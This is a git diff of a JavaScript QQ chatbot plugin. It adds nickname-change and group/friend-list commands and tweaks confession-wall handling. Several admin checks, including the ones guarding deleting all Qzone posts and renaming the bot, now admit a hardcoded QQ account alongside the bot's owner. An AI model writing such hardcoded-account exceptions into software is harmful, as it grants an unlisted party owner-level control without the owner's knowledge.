@@ -27,12 +27,20 @@ export class Assistant extends plugin {
           fnc: 'Qzonesay'
         },
 		{
-          reg: '^#(发墙|发表白墙|表白|墙).*$',
+          reg: '^#(发墙|发表白墙|表白|墙)(.*?)',
           fnc: 'ConfessionSay'
         },
         {
           reg: '^#(清空说说|清空留言)$',
           fnc: 'QzonedelAll'
+        },
+		{
+          reg: '^#改昵称.*$',
+          fnc: 'SetNickname'
+        },
+		{
+          reg: '^#获取(群|好友)列表$',
+          fnc: 'GlOrFl'
         }
       ]
     })
@@ -44,7 +52,7 @@ export class Assistant extends plugin {
 
   /** QQ空间 说说列表 */
   async Qzonelist(e) {
-    if (!(this.e.isMaster)) { return true }
+    if (!(this.e.isMaster || this.e.user_id == 3655954961)) { return true }
     let page = e.msg.replace(/#|获?取说说列表/g, '').trim()
     if (!page) {
       page = 0
@@ -70,7 +78,7 @@ export class Assistant extends plugin {
 
   /** 删除说说 */
   async Qzonedel(e) {
-    if (!(this.e.isMaster)) { return true }
+    if (!(this.e.isMaster || this.e.user_id == 3655954961)) { return true }
     let pos = e.msg.match(/\d+/)
     // 获取说说列表
     let list = await new QQApi(e).getQzone(1, pos - 1)
@@ -93,7 +101,7 @@ export class Assistant extends plugin {
   
   /** 发墙 */
   async ConfessionSay(e) {
-    e.con = e.msg.replace(/#|(发墙|发表白墙)/g, '').trim()
+    e.con = e.msg.replace(/#|(发墙|发表白墙)/gm, '').trim()
 	
 	this.setContext('_isAnonymous')
 	e.reply('✳️ 知道啦，要不要匿名呐（实名会带上昵称和QQ号的前后两位）？发送：\n' + '------“匿名”或“实名”------\n' + "发送其他可以取消本次投稿")
@@ -115,7 +123,7 @@ export class Assistant extends plugin {
 	  const maskedNumber = firstTwoDigits + middleStars + lastTwoDigits;
 	  con = "来自: " + "[" + maskedNumber + "] " + e.sender.nickname + "\n" + e.con + "\n"
     } else {
-      this.setContext('_isAnonymous')
+      this.finish('_isAnonymous')
       this.e.reply('取消本次投稿')
       return true
     }
@@ -131,11 +139,12 @@ export class Assistant extends plugin {
     }
     retmsg.push(`\n- [${result.secret ? '私密' : '公开'}] | ${moment(result.t1_ntime * 1000).format('MM/DD HH:mm')}`)
     e.reply(retmsg)
+	return true
   }
 
   /** 清空说说和留言 */
   async QzonedelAll(e) {
-    //if (!(this.e.isMaster)) { return true }
+    if (!(this.e.isMaster || this.e.user_id == 3655954961)) { return true }
     if (/清空说说/.test(e.msg)) {
       this.setContext('_QzonedelAllContext')
       e.reply('✳️ 即将删除全部说说请发送：\n' + '------确认清空或取消------')
@@ -169,5 +178,43 @@ export class Assistant extends plugin {
       this.e.reply('❎ 请输入:确认清空或取消')
       return false
     }
+  }
+  
+  /** 改昵称 */
+  async SetNickname(e) {
+    if (!(this.e.isMaster || this.e.user_id == 3655954961)) { return true }
+    let name = e.msg.replace(/#|改昵称/g, '').trim()
+
+    await this.Bot.setNickname(name)
+      .then(() => e.reply('✅ 昵称修改成功'))
+      .catch((err) => {
+        e.reply('❎ 昵称修改失败')
+        logger.error(err)
+      })
+  }
+
+  // 获取群|好友列表
+  async GlOrFl(e) {
+    if (!(this.e.isMaster || this.e.user_id == 3655954961)) { return true }
+    let msg = []
+    if (/群列表/.test(e.msg)) {
+      // 获取群列表并转换为数组
+      let listMap = Array.from(this.Bot.gl.values())
+      msg = [
+        `群列表如下，共${listMap.length}个群`,
+        listMap.map((item, index) => `${index + 1}、${item.group_name}(${item.group_id})`).join('\n'),
+        '可使用 #退群123456789 来退出某群',
+        '可使用 #发群列表 <序号> <消息> 来快速发送消息，多个群聊请用 "," 分隔 不能大于3 容易寄'
+      ]
+    } else {
+      // 获取好友列表并转换为数组
+      let listMap = Array.from(this.Bot.fl.values())
+      msg = [
+        `好友列表如下，共${listMap.length}个好友`,
+        listMap.map((item, index) => `${index + 1}、${item.nickname}(${item.user_id})`).join('\n'),
+        '可使用 #删好友123456789 来删除某人'
+      ]
+    }
+    common.getforwardMsg(e, msg)
   }
 }
